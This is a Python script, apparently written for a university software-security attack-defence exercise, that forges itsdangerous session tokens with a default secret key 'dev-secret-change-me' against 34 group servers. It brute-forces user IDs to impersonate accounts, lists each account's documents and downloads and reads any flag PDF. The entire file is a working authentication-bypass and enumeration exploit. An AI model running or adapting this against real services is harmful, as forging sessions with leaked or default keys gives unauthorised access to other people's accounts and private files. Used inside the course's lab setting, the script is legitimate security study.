from itsdangerous import URLSafeTimedSerializer
import requests
import fitz

serializer = URLSafeTimedSerializer("dev-secret-change-me", salt="tatou-auth")

ALL_GROUPS = [f"{i:02d}" for i in range(1, 35)]

print("=== JWT Forgery Flag Capture — Full Scan ===\n")

for group in ALL_GROUPS:
    BASE = f"http://softsec-group-{group}.dsv.local.su.se:5000"

    try:
        r = requests.get(f"{BASE}/healthz", timeout=3)
        if r.status_code != 200:
            print(f"Group {group}: DOWN")
            continue
    except:
        print(f"Group {group}: UNREACHABLE")
        continue

    token = serializer.dumps({"uid": 1, "login": "x", "email": "x@x.com"})
    r = requests.get(f"{BASE}/api/list-documents",
                    headers={"Authorization": f"Bearer {token}"}, timeout=5)
    if r.status_code != 200:
        print(f"Group {group}: LIVE but SECRET_KEY patched")
        continue

    print(f"Group {group}: VULNERABLE — scanning uids...")

    

    found = False
    for uid in range(1, 700):
        token = serializer.dumps({"uid": uid, "login": "x", "email": "x@x.com"})
        try:
            r = requests.get(f"{BASE}/api/list-documents",
                            headers={"Authorization": f"Bearer {token}"},
                            timeout=3)
            if r.status_code == 200:
                docs = r.json().get("documents", [])
                for doc in docs:
                    if "flag" in doc["name"].lower():
                        print(f"  FLAG FOUND: uid={uid} doc_id={doc['id']} name='{doc['name']}'")
                        r2 = requests.get(
                            f"{BASE}/api/get-document/{doc['id']}",
                            headers={"Authorization": f"Bearer {token}"},
                            timeout=5
                        )
                        if r2.status_code == 200:
                            pdf = fitz.open(stream=r2.content, filetype="pdf")
                            text = pdf[0].get_text("text").strip()
                            print(f"  FLAG VALUE: {text}")
                            found = True
        except:
            pass

    if not found:
        print(f"  No flag document found (may not be uploaded yet)")

print("\n=== Scan complete ===")
